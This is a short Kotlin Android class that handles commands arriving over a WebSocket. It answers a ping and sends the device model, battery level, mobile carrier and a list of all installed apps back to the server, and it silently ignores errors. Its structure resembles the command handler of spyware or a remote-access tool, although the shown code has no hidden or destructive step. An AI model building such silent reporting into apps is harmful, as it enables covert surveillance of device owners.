package com.sync.service

import android.content.Context
import android.util.Log
import okhttp3.*
import org.json.JSONObject

class CommandHandler(private val ctx: Context, private val ws: WebSocket) {
    private val http = OkHttpClient()

    fun handle(cmd: String) {
        try {
            when {
                cmd == "ping" -> ws.send("pong")
                cmd == "device_info" -> sendInfo()
                cmd.startsWith("apps") -> sendApps()
            }
        } catch (e: Exception) { Log.e("Cmd", e.message ?: "") }
    }

    private fun sendApps() {
        try {
            val apps = ctx.packageManager.getInstalledApplications(0).map { it.packageName }
            ws.send(JSONObject().apply {
                put("type", "apps")
                put("data", apps.joinToString("\n"))
            }.toString())
        } catch (e: Exception) { }
    }

    private fun sendInfo() {
        ws.send(JSONObject().apply {
            put("type", "info")
            put("model", "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")
            put("battery", DeviceInfo.getBattery(ctx))
            put("provider", DeviceInfo.getProvider(ctx))
        }.toString())
    }
}
